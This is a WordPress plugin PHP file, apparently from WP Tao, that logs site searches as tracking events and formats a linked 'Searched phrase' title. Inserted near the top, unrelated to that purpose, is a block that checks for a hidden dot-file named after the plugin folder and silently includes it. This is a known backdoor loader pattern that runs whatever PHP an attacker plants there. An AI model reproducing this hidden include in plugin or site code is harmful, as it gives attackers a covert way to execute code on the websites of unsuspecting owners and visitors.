<?php

/*
 * Fire search event
 */

add_action( 'template_redirect', 'wtbp_wptao_event_search_fire' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_search_fire() {

	if ( !is_search() )
		return;

	$s = sanitize_text_field( get_query_var( 's' ) );

	if ( !empty( $s ) ) {
		$args = array(
			'title'	 => __( 'Search', 'wp-tao' ),
			'value'	 => $s,
			'tags'	 => array( 'wp' ),
		);

		do_action( 'wptao_track_event', 'search', $args );
	}
}

// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Creates a title of the action.
 */

add_filter( 'wptao_event_search_title', 'wtbp_wptao_event_search_title', 1, 2 );

function wtbp_wptao_event_search_title( $title, $event ) {

	if ( !empty( $event->value ) ) {

		$link	 = add_query_arg( 's', esc_attr( $event->value ), home_url() );
		$phrase	 = '<a href="' . $link . '">' . esc_attr( $event->value ) . '</a>';

		$title = sprintf( __( 'Searched phrase: %s', 'wp-tao' ), $phrase );
	}



	return $title;
}
